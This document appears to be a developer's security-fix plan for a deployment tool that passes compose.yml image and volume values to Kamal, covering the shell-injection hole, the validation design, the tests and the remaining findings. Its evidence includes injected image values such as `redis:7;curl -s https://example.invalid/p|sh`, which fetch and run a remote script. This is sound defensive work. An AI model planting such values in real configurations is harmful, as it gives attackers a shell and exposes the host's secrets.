# Plan: no shell syntax in the compose values Kamal puts on a command line

## Direction
- From a security review of `main` (4888017): "a repo pusher gets a shell on the host through an accessory's `image:` (and likely through volume targets)". The owner: "fix the compose.yml hole in houston".

## Evidence
- `internal/kamal/kamal.go` (`config`): an accessory's `Image` is `g.plain(path+".image", svc.Image, true)`. `plain` refuses only secret references and `${`; nothing checks the rest of the string.
- `internal/kamal/kamal.go` (`volumes`): each named volume becomes `<project>_<source>:<target>`, for the app's role and every accessory, unchecked.
- Kamal runs `kamal accessory boot` and the app's containers over SSH (`houston@127.0.0.1`) as one shell command line. Houston's own `command()` quotes `cmd` because "it runs through the host's shell"; Kamal 2 escapes option values but places the image and the `--volume` values as they are.
- compose-go accepts any non-empty image, and any volume target, so `services: {db: {image: "redis:7;curl …|sh"}}` loaded, and `houston inspect` passed it (`TestImageRefusesShellSyntax` failed for all ten hostile values before the fix; `TestVolumeTargetRefusesShellSyntax` for all eighteen).
- Who: anyone who can push to a linked repo's deploy branch. Tests run only when `commands.test` is set, and the command would run as `houston`, in the `docker` group: every project's secrets, the Cloudflare token and the encryption keys.

## Design
`project.Load` refuses the values before anything reaches Kamal, with the field's path, so `houston inspect` (exit 2), Mission Control's sync and a deploy all say why:
- **`image`** must parse as a Docker reference (`github.com/distribution/reference`, Docker's own grammar: no whitespace, no shell metacharacters, no leading `-`, lowercase). A variable reference (`${TAG}`, `${TAG:-7}`, `$TAG`) stands in as a plain word while checking; the Kamal config still resolves or refuses it as before. A default holding anything but `[A-Za-z0-9_.-]`, and `$(…)`, are not references, so they fail.
- **A named volume's mount path** must be absolute and only `[A-Za-z0-9._/@+-]`, for the app and accessories.
- **A named volume's name** must be Docker's `[A-Za-z0-9][A-Za-z0-9_.-]*`.
- Not changed: the app's image is the project's name (already `[a-z0-9-]`); `cmd` and the health command are quoted; secrets reach Kamal as environment; the release hook runs `docker` with an argv, no shell.

## Acceptance criteria → tests (`internal/project/shell_values_test.go`)
| Criterion | Test |
|---|---|
| Hostile images (`;`, `&&`, `$(…)`, backticks, `\|`, `>`, leading `-`, space, newline, uppercase) are refused at `services.<name>.image` | `TestImageRefusesShellSyntax` |
| Real references load: plain, tagged, registry with port, digest | `TestImageAcceptsRealReferences` |
| Variable references load; shell syntax beside or inside one is refused | `TestImageVariables` |
| Hostile mount paths are refused on the app and on accessories | `TestVolumeTargetRefusesShellSyntax` |
| Ordinary mount paths load | `TestVolumeTargetAcceptsPaths` |
| A secret in an image is still Kamal's message (unchanged) | `TestConfigRejectsSecretsOutsideEnvironment` |

## Evidence (after)
- `bin/go test ./...`: 36 packages pass; gofmt and `go vet ./internal/...` clean.
- Mutation check: with the image check disabled, `TestImageRefusesShellSyntax` fails; with the path check disabled, `TestVolumeTargetRefusesShellSyntax` fails.
- The five live projects' `compose.yml` (equip, estherpictures, svnmns, valleybuiltcrossfit-go, vccmenu) still load with this branch's `houston inspect`.
- The same binary on svnmns's compose.yml plus `image: "redis:7;curl -s https://example.invalid/p|sh"`: exit 2, "services.cache.image: … isn't an image name Docker accepts".

## Not in this change (from the same review)
- Every project's containers share Kamal's `kamal` network (medium): a project can reach another's database or Redis by name.
- Custom domains are pointed without the admin's approval (low).
- A global sign-in failure cap that anyone can fill (low); release-hook containers can carry another project's labels (low); release assets are unsigned (low).
